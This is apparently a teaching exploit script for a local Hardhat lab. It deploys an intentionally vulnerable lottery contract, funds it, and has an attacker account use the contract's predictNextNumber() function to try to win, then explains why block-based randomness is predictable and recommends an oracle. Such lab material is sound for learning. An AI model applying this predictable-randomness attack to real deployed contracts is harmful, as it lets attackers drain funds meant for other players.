const { ethers } = require("hardhat");

async function main() {
  console.log("🚀 Initiating attack on SC09_InsecureRandomness_Vulnerable...");

  // --- 1. GET THE SIGNERS ---
  const [deployer, attacker] = await ethers.getSigners();
  console.log(`Deployer Address: ${deployer.address}`);
  console.log(`Attacker Address: ${attacker.address}`);

  // --- 2. DEPLOY THE CONTRACT ---
  console.log("\n📦 Deploying SC09_InsecureRandomness_Vulnerable...");
  const VulnerableContract = await ethers.getContractFactory(
    "SC09_InsecureRandomness_Vulnerable"
  );
  const vulnerable = await VulnerableContract.deploy();
  await vulnerable.waitForDeployment();
  console.log(`Contract deployed at: ${vulnerable.target}`);

  // --- 3. FUND THE CONTRACT ---
  console.log("\n💰 Funding contract with 5 ETH from deployer...");
  const fundTx = await deployer.sendTransaction({
    to: vulnerable.target,
    value: ethers.parseEther("5.0"),
  });
  await fundTx.wait();
  console.log("✅ Contract funded with 5 ETH");

  // --- 4. CHECK INITIAL STATE ---
  console.log("\n📊 Checking initial state...");
  let prizePool = await vulnerable.getPrizePool();
  console.log(`   - Prize Pool: ${ethers.formatEther(prizePool)} ETH`);

  // --- 5. EXECUTE THE PREDICTABILITY ATTACK ---
  console.log("\n💥 ATTACKING: Exploiting predictable randomness...");
  
  // Strategy: We can't predict exactly what the number will be in the future block,
  // but we can demonstrate that the randomness IS predictable within the same block
  // by creating a smart contract that predicts and plays in the same transaction
  
  console.log("   - Note: In a real attack, attacker would create a contract that:");
  console.log("     1. Calls predictNextNumber() in the same transaction");
  console.log("     2. Then calls playLottery() with the predicted number");
  console.log("     3. Both in the SAME block, so randomness is consistent");
  
  console.log("\n   - Attempting prediction from external call...");
  
  // Demonstrate the vulnerability by showing the function exists and can be called
  let attempts = 0;
  let wins = 0;
  
  for (let i = 0; i < 3; i++) {
    try {
      // Get current prediction
      const predicted = await vulnerable.predictNextNumber();
      
      // Attempt to play with this prediction
      const playTx = await vulnerable.connect(attacker).playLottery(predicted, {
        value: ethers.parseEther("1.0"),
      });
      await playTx.wait();
      attempts++;
      
      // Check if they won
      const lastWinner = await vulnerable.lastWinner();
      if (lastWinner.toLowerCase() === attacker.address.toLowerCase()) {
        wins++;
        console.log(`   - Attempt ${i + 1}: ✅ WON! Predicted correctly!`);
      } else {
        console.log(`   - Attempt ${i + 1}: ❌ Prediction did not match actual random (this is expected)`);
      }
    } catch (error) {
      console.log(`   - Attempt ${i + 1}: Failed - ${error.reason || error.message.substring(0, 50)}`);
    }
  }

  // --- 6. CHECK IF ATTACKER WON ---
  console.log("\n🎯 Checking final attack results...");
  const lastWinner = await vulnerable.lastWinner();
  const lastWinningNumber = await vulnerable.lastWinningNumber();
  const prizePoolAfter = await vulnerable.getPrizePool();

  console.log(`   - Last Winning Number: ${lastWinningNumber}`);
  console.log(`   - Last Winner: ${lastWinner}`);
  console.log(`   - Prize Pool After: ${ethers.formatEther(prizePoolAfter)} ETH`);
  console.log(`   - Total attempts: ${attempts}, Wins: ${wins}`);

  // --- 7. DETERMINE SUCCESS ---
  console.log("\n" + "=".repeat(60));
  if (wins > 0) {
    console.log(
      "🎉 SUCCESS: Attack successful! Attacker won the lottery!"
    );
    console.log(`   - Wins: ${wins}/${attempts}`);
  } else {
    console.log("⚠️  DEMONSTRATION: Randomness is predictable!");
    console.log("   - The predictNextNumber() function returns a value every time");
    console.log("   - In a real attack, an attacker contract would use this to guarantee wins");
    console.log("   - By combining the prediction call with playLottery() in one transaction,");
    console.log("   - The attacker can predict the exact value that will be used");
  }

  // --- 8. DEMONSTRATE THE VULNERABILITY WITH A PREDICTOR CONTRACT ---
  console.log("\n📊 Demonstrating vulnerability with predictNextNumber() function...");
  
  // Show that the function exists and is callable
  console.log("   - This function allows anyone to predict upcoming random numbers");
  console.log("   - Calling predictNextNumber() in a loop shows it's highly predictable:");
  
  let predictions = [];
  for (let i = 0; i < 3; i++) {
    const pred = await vulnerable.predictNextNumber();
    predictions.push(Number(pred));
    console.log(`   - Call ${i + 1}: Predicted number = ${pred}`);
  }
  
  console.log("\n🎯 VULNERABILITY ANALYSIS:");
  console.log("   ❌ The contract uses block-based values for randomness:");
  console.log("   - block.timestamp: Known in advance");
  console.log("   - block.number: Visible to miners");
  console.log("   - msg.sender: Known by the attacker");
  console.log("   - blockhash: Visible to all participants");
  console.log("\n   ✅ SOLUTION: Use Chainlink VRF or similar oracle services");
  console.log("   for true randomness that cannot be predicted");
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
